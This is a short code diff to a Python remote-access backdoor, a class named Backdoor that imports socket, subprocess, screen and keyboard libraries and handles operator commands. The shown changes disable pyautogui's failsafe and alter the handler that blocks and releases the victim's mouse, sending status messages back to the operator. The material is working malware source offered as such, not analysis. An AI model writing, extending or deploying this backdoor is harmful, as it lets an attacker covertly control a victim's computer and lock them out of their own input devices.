@@ -2,6 +2,8 @@ import socket, json, subprocess, os, cv2, pyautogui
 import base64, threading, time, webbrowser
 import keyboard
 
+pyautogui.FAILSAFE = False
+
 def uMad(event):
     return False
 
@@ -169,7 +171,7 @@ class Backdoor:
 						block_cursor_thread.start()
 						self.reliable_send("[+] Mouse disconnected")
 					elif command.split()[1] == "true":
-						self.block_cursor = False
+						self.cursor_blocking = False
 						self.reliable_send("[+] Mouse connected")
 					else:
 						self.reliable_send("[-] Can't understand your command")
